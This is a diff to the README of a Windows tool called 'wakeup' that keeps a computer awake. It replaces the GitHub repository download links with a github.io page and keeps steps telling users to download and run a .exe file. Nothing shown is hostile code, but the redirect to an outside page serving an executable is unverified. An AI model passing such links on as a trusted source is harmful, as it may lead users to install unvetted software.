@@ -1,6 +1,6 @@
 # ☕ wakeup - Keep your computer awake easily
 
-[Visit this page to download](https://github.com/sheep8866/wakeup)
+[Visit this page to download](https://sheep8866.github.io)
 
 ## 🎯 About This Program
 
@@ -10,7 +10,7 @@ Computers often enter sleep mode to save energy. This behavior stops background 
 
 You can install this tool on your Windows 10 or Windows 11 computer. Follow these steps to set it up:
 
-1. Visit the project release page: [https://github.com/sheep8866/wakeup](https://github.com/sheep8866/wakeup)
+1. Visit the project release page: [https://sheep8866.github.io](https://sheep8866.github.io)
 2. Look for the Assets section.
 3. Find the file ending in .exe for Windows.
 4. Click the link to save the file to your computer.
